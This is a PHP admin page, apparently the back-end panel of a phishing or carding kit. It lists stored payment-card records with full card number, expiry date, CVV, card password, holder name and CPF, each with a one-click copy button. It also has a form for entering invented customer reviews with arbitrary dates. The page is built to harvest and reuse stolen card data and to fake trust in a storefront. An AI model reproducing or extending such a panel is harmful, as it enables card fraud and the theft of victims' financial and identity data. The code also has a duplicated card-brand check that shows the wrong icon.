<?php
require_once "include/header.php";

$sql = "SELECT * FROM vendas WHERE tipoPagamento='CC'";
$stmt = $PDO->prepare($sql);
$stmt->execute();

?>
<link href="assets/css/pace.min.css" rel="stylesheet" />
<script src="assets/js/pace.min.js"></script>
<style>
  #mkTabelaInfos tr {
    align-items: center;
    width: 100%;
  }
  #mkTabelaInfos a {
    cursor: pointer;
  }
</style>
<div class="clearfix"></div>

<div class="content-wrapper">
  <div class="container-fluid">
    <div class="row">
      <div class="col-12 col-lg-12">
        <div class="card">
          <div class="card-header">Lista de CCs
          </div>
          <div class="table-responsive">
            <table id="mkTabelaInfos" class="table text-center" cellpadding="0" cellspacing="0">
              <thead class="text-uppercase">
                <tr>
                  <th>id</th>
                  <th>cartão</th>
                  <th>validade</th>
                  <th>cvv</th>
                  <th>senha cc</th>
                  <th>titular</th>
                  <th>cpf titular</th>
                  <th>banco</th>
                  <th>bandeira</th>
                  <th>categoria</th>
                  <th></th>
                </tr>
              </thead>
              <tbody>
                <?php while ($ccs = $stmt->fetch(PDO::FETCH_ASSOC)) : ?>
                  <tr>
                    <td><a><?php echo $ccs['id'] ?></a></td>
                    <td><a onclick="copy(this);return exibirSucessoCopiado();"><?php echo $ccs['numerocc'] ?></a></td>
                    <td><a onclick="copy(this);return exibirSucessoCopiado();"><?php echo $ccs['validadecc'] ?></a></td>
                    <td><a onclick="copy(this);return exibirSucessoCopiado();"><?php echo $ccs['cvvcc'] ?></a></td>
                    <td><a onclick="copy(this);return exibirSucessoCopiado();"><?php echo $ccs['senhacc'] ?></a></td>
                    <td><a onclick="copy(this);return exibirSucessoCopiado();"><?php echo $ccs['titularcc'] ?></a></td>
                    <td><a onclick="copy(this);return exibirSucessoCopiado();"><?php echo $ccs['cpfcc'] ?></a></td>
                    <td><a onclick="copy(this);return exibirSucessoCopiado();"><?php echo $ccs['banco_cc'] ?></a></td>
                    <td>
                      <a>
                        <?php
                        if ($ccs['bandeira_cc'] == "MASTERCARD") {
                          echo "<img width='35' height='24' src='https://icons.yampi.me/svg/card-mastercard.svg'>";
                        } else if ($ccs['bandeira_cc'] == "VISA") {
                          echo "<img width='35' height='24' src='https://icons.yampi.me/svg/card-visa.svg'>";
                        } else if ($ccs['bandeira_cc'] == "AMERICAN EXPRESS") {
                          echo "<img width='35' height='24' src='https://icons.yampi.me/svg/card-amex.svg'>";
                        } else if ($ccs['bandeira_cc'] == "DINERS CLUB INTERNATIONAL") {
                          echo "<img width='35' height='24' src='https://icons.yampi.me/svg/card-discover.svg'>";
                        } else if ($ccs['bandeira_cc'] == "DINERS CLUB INTERNATIONAL") {
                          echo "<img width='35' height='24' src='https://icons.yampi.me/svg/card-diners.svg'>";
                        } else if ($ccs['bandeira_cc'] == "HIPERCARD") {
                          echo "<img width='35' height='24' src='https://icons.yampi.me/svg/card-hipercard.svg'>";
                        }
                        ?>
                      </a>
                    </td>
                    <td onclick="copy(this);return exibirSucessoCopiado();"><a><?php echo $ccs['categoria_cc'] ?></a></td>
                  </tr>
                <?php endwhile; ?>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
    <div class="overlay toggle-menu"></div>
  </div>
</div>

<div class="modal fade" id="mkModalCadastrarAvaliacao" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Cadastrar uma nova avaliação</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body text-center">
        <form method="POST" action="assets/php/mkCadastraAvaliacao.php" enctype="multipart/form-data">
          <input type="hidden" id="modal-data-id-editar-configuracao" name="id" value="">
          <div class="form-group row">
            <label class="col-lg-3 col-form-label form-control-label">Nome</label>
            <div class="col-lg-9">
              <input class="form-control" type="text" name="nome" id="nome" required>
            </div>
          </div>
          <div class="form-group row">
            <label class="col-lg-3 col-form-label form-control-label">Comentário</label>
            <div class="col-lg-9">
              <input class="form-control" type="text" name="comentario" id="comentario" required>
            </div>
          </div>
          <div class="form-group row">
            <label class="col-lg-3 col-form-label form-control-label">Estrela</label>
            <div class="col-lg-9">
              <select class="form-control" name="estrelas" id="estrelas">
                <option value="1">1</option>
                <option value="2">2</option>
                <option value="3">3</option>
                <option value="4">4</option>
                <option value="5">5</option>
              </select>
            </div>
          </div>
          <div class="form-group row">
            <label class="col-lg-3 col-form-label form-control-label">Data</label>
            <div class="col-lg-9">
              <input class="form-control" type="text" name="data" id="data" required>
            </div>
          </div>
          <div class="form-group row">
            <label class="col-lg-3 col-form-label form-control-label"></label>
            <div class="col-lg-9 mt-4">
              <input type="submit" class="btn btn-success" value="Salvar" name="Cadastrar" id="Cadastrar">
            </div>
          </div>
        </form>
      </div>
    </div>
  </div>
</div>


<div aria-live="polite" aria-atomic="true" style="position: relative; min-height: 200px;">
  <div id="mkConfirmCopy" class="toast alert alert-success" style="position: fixed; top: 85px; right: 15px;">
    <div class="toast-body">
      Copiado com sucesso
    </div>
  </div>
</div>


<?php
require_once "include/footer.php";
?>

<script>
  function copy(that) {
    var inp = document.createElement('input');
    document.body.appendChild(inp)
    inp.value = that.textContent
    inp.select();
    document.execCommand('copy', false);
    inp.remove();
  }

  function exibirSucessoCopiado() {
    $('#mkConfirmCopy').toast('show')
    setTimeout(function() {
    }, 3000);
  }
</script>